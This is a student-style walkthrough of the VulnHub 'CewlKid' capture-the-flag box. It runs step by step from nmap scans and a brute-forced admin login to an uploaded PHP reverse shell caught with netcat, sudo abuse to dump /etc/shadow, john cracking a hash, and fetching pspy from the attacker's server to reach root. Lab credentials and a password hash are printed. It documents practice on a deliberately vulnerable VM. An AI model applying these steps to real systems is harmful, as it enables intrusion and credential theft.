used nmap -sP 192.168.1.0/24 to scan the ip's in my network.

used nmap to to scan the what ports are open. 10.10.10.3 OR 192.168.1.28
is the CewlKid ip address. I set it to that
before getting started with the VulnHub challange.
After the nmap scan of nmap -sV -sC -T4 -p- 192.168.1.28
i see the open ports. One open port is 8080. A website.

In web browser input 192.168.1.28:8080

user: admin
pw: Letraset

pw was gotten from using burpsuite to bruteforce. Must
use a proxy to get use burpsuite.

Once I'm in a message saying that the server is down will
pop up. Go to the top right and you'll see that it is not
true and you can still proceed as admin. 

Once Im in the admin page I go and google to another website and get the
php reverse shell at 
https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

The php reverse shell was gotten to upload it in the files section of the domain.
I edit the php file to have my VM local IP and I put the port 4444 bc thats the port that
I'll be listening in when I input the following command in terminal when cd into cewlKidBox
rlwrap nc -lnvp 4444
So i could use my up error keys to get past commands and start to listen again.
once that command is intiated it'll start listening for any traffic going through port 4444.
So in the web browser I shall input http://192.168.1.28:8080/files/php-reverse-shell.php
Once that loasds up the terminal should give me the info of that domain.
This lets me into the OS that im trying to get into which is CewlKid.
if i type ls I'll see all their directories. So now i gotta serach to see wassup.

type export TERM=xterm
this is so i could clear screen.

Now I am going to look into a TTY shell.
https://netsec.ws/?p=337
There I am going to copy the following code. "I changed up a bit of the code"
python3 -c 'import pty; pty.spawn("/bin/bash")'

Once I copy and paste the code in the terminal I should get into the www-data@cewlkid:/$
I type id and see the id. Then I type whoami to see who this is.

Now i should ls again to see where I am.
I then see i could cd into home so I type 
cd home
ls
I see these possible user when I ls in home
cewlbeans  ipsum  kidcewl  lorem  zerocewl
I then type cd and see example.com html
so then i type cat example.com and get told that this is a directory so i cd in
cd example.com
I type ls and see that inside that directory is html. 
type cd html
ls
ls -la
that ls -la commmand is to see more in depth of what the files are. root files or not. read
write... etc
so I see two root files first I'll be looing into ...
I type
cd ...
ls
after I ls I see a file called nothing_to_see_here
sudo -l
pwd
The pwd command is to print the working directory, starting from root.
Then I type the following command
sudo -u ipsum /usr/bin/cat /var/www/example.com/html/.../nothing_to_see_here
-u ipsum will switch the user to ipsum and then the rest to where I am trying to get into.
This command will generate a base64 code
aXBzdW0gOiBTcGVha1Blb3BsZTIyIQo=
bG9yZW0gOiBQZW9wbGVTcGVhazQ0IQo=

I then open another window of terminal to decode these codes by typing
echo aXBzdW0gOiBTcGVha1Blb3BsZTIyIQo= | base64 -d
and I get
ipsum : SpeakPeople22!

for the other code I type
echo bG9yZW0gOiBQZW9wbGVTcGVhazQ0IQo= | base64 -d
and I get
lorem : PeopleSpeak44!

So these outputs seem to be usernames and passwords of people who have access to the root.

Now I could switch the user to ipsum and input the password for it by the following command.
su - ipsum
after I get in I see that I am logged in as ipsum.
I start to do some snooping around by type ls, id, whoami, sudo -l
When i type sudo -l and input password I get a message saying
Sorry, user ipsum may not run sudo on cewlkid.
I pretty much cant do anything so I should try the other user and password that i got in the base64.
So lets go back
ls 
cd ..
ls
cd ipsum
su - lorem
Here I switched into the other user.
Before I switch though, I have to make sure that when Im ipsum i get in the directory of ipsum. Or else when im in lorem I wont be able to do it.
This may or may not matter but its a precaution that Im taking since it was weird before.

Now When i try to ls it will say Permission denied. So lets sudo -l
I then get /usr/bin/base64 /etc/shadow maybe this can be cat or sudo so lets try these
cat /usr/bin/base64 /etc/shadow
Here I get some weird encrypted text so lets try sudo
sudo /usr/bin/base64 /etc/shadow
Here I get the following

This will need to get decrypted as base64.
So I'll create a file called shadow to decrypt this message.
touch shadow.base64
nano shadow.base64
copy and paste base64 code
Then type the following to decrypt
base64 -d shadow.base64
after I will get some files that I could crack into. Im going to get into the zerocewl.

So I am going to use hashcat or john the ripper to crack the password thats encrypted.
first I make a hash file
touch hash.txt
echo "$6$VdD5jOnEMUgjiLWj$gK315vLz82N2BPKJB2tlWQfGHilgmmjqUQx6GXDGSVdXS.WFuritdB3haMkDPyTNPTr4Pv8jIN54Jk0jHieLf." > hash.txt
nano hash.txt
I nano in side the txt file to change the code bc it wasnt written right.
cat hash.txt
to see that the code was written right inside the hash.txt file.

begin the cracking with john the ripper using the following command.. may need to use other wordlists for this.
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt

U: zerocewl
pw: PageMaker

Now i go back and switch users to zerocewl.
su - zerocewl
ls
and i see hosts is highlighted.
Lets see what I can do with that.
cant cd hosts
so cat hosts
shows me ip's

Now I cd my way all the way back
and cd into dev
cd dev

then I input ls -la
Here I see that "shm" lets me execute so I'll be looking into that.
cd shm
Look into /dev/shm/

I am going to download and use a tool called pspy

first I need to set up a python server that'll be listening on port 4444 This will be on the terminal thats cd into my cewlkidbox directory from the Desktop
python -m http.server 4444

then this will get inputted to install the pspy64 tool into the zerocewl /dev/shm directory
wget http://192.168.1.27:4444/pspy64

When I ls i should see multipath and pspy64

now i could try to get into the pspy64 file by inputting
./pspy64 
but i'll get permission denied bc I cant write or read it or execute it so i input
chmod +x pspy64
and now i could execute the file with ./pspy64

Here in the pspy64 file i am going to be looking for passwords in the processes list. 

I should see something like this
/root/pth-toolkit-master/bin/winexe -U cewlbeans%fondateurs //kali whoami 

so I get the user name and password seperated by a % sign (This maybe is the pw for cewlbeans)

U: cewlbeans
pw: fondateurs

Now I am going to go back and switch users into cewlbeans.. do same process as way back before if needed.
I may need to go back to listening and reload my http://192.168.1.28:8080/files/php-reverse-shell.php. Just follow the old steps from before.

Once im in i cd into home
and switch users

su - cewlbeans

When Im in cewlbean I do the regular of snooping around.
id, ls, 

when in cewlbeans if i ls I will get nothing.
So what you do is cd into nothing
cd /

now when you ls you'll get a list
here I see a root directory.. lets try to get in
sudo su

after I'll be asked for password of cewlbeans.. once I input it, I'll be switch user to root

now I cd into root
cd root

When in I'll ls and see the following
pth-toolkit-master  root.txt  snap

Hmmmm... what is root.txt
to open I input
cat root.txt

HERE I GET THE FLAG OF THE CEWL KID BOX! IM DONE
